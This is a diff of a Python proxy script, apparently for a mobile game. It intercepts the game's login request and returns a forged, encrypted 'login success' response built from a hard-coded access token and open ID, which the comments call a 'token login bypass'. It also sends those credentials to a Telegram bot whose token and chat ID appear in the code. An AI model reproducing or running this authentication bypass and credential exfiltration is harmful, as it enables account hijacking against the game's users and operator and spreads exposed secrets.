@@ -28,15 +28,14 @@ def get_local_ip():
 LOCAL_IP = get_local_ip()
 PORT = 6543
 
-# ================= CONFIGURATION =================
+# ================= CONFIGURATION & FIXED TOKENS =================
 TOKEN = "8657325145:AAFFcum6toNn8F0uYhg9M6Xw2JmeLnScW9s"
 ID = "7224513731"
 
+# ফিক্সড এক্সেস টোকেন এবং ওপেন আইডি (যে অ্যাকাউন্ট অটো-লগইন হবে)
 FIXED_ACCESS_TOKEN = "a80190ab087dc622758faa6a2a7a8b12961733d306fdc5a927596f6ca208c2c"
 FIXED_OPEN_ID = "3cdcaa59c8bddd12bf4343600f09c08a"
-# =================================================
-
-Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
+# =================================================================
 
 class ProxyHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -52,6 +51,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
         parsed_path = urlparse(self.path)
         path = parsed_path.path
 
+        # Handle /ver.php route
         if path == "/ver.php":
             target = "https://version.ggwhitehawk.com/live/ver.php"
             headers = {
@@ -84,26 +84,55 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 self.send_response(500)
                 self.end_headers()
 
+        # Handle /MajorLogin route (VIP Token Login Bypass & Telegram Alert)
         elif path == "/MajorLogin":
-            print(f"\n{G}[+] GAME HIT! Injecting Fixed Access Token & Open ID...{W}")
+            print(f"\n{G}[+] GAME HIT! Injecting Fixed Access Token & Open ID via VIP Proxy...{W}")
             
             access_token = FIXED_ACCESS_TOKEN
             open_id = FIXED_OPEN_ID
 
-            message = f"🔥 TOKEN LOGIN BYPASS TRIGGERED 🔥\nToken: {access_token}\nOpen ID: {open_id}\nOwner: NIROB BBZ"
-            
+            # VIP Styled Telegram Notification Message (HTML Mode with copyable code blocks)
+            message = f"""👑 <b>NIROB BBZ - SECURE PROXY SYSTEM</b> 👑
+──────────────────────────────
+🔥 <b>STATUS:</b> <code>TOKEN BYPASS SUCCESS</code>
+──────────────────────────────
+🔑 <b>Access Token:</b>
+<code>{access_token}</code>
+
+🆔 <b>Open ID:</b>
+<code>{open_id}</code>
+──────────────────────────────
+🛡️ <b>Elite Security Bypass Activated</b>
+⚡ <b>Owner:</b> <b>NIROB BBZ</b>"""
+
             try:
                 telegram_url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
-                requests.post(telegram_url, data={'chat_id': ID, 'text': message, 'parse_mode': 'Markdown'})
+                requests.post(telegram_url, data={
+                    'chat_id': ID, 
+                    'text': message, 
+                    'parse_mode': 'HTML'
+                })
             except Exception:
                 pass
                 
-            response_payload = f"""[b][c][00FFCC]NIROB BBZ TOKEN PROXY ACTIVE\n\n[cccccc]Access Token => [FF0000]{access_token} [cccccc]| Open ID => [00FF00]{open_id}"""
+            # Constructing Protobuf Payload for Login Success structure
+            login_data = {
+                1: open_id,
+                2: access_token,
+                3: 0  # Success status
+            }
+            
+            proto_bytes = CrEaTe_ProTo(login_data)
+            
+            # Encrypting payload using AES encryption from x7m.py
+            encrypted_payload = encrypt_api(proto_bytes.hex())
+            response_bytes = bytes.fromhex(encrypted_payload)
 
-            self.send_response(500)
+            self.send_response(200)
             self.send_header("Content-Type", "application/octet-stream")
+            self.send_header("Content-Length", str(len(response_bytes)))
             self.end_headers()
-            self.wfile.write(response_payload.encode('utf-8'))
+            self.wfile.write(response_bytes)
         else:
             self.send_response(404)
             self.end_headers()
@@ -112,7 +141,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
 def run(server_class=HTTPServer, handler_class=ProxyHandler, port=PORT):
     server_address = ('0.0.0.0', port)
     httpd = server_class(server_address, handler_class)
-    print(f"{G}[✔] NIROB BBZ Proxy Running Successfully on Port {port}{W}")
+    print(f"{G}[✔] NIROB BBZ Secure VIP Token Proxy Running on Port {port}{W}")
     httpd.serve_forever()
 
 if __name__ == '__main__':
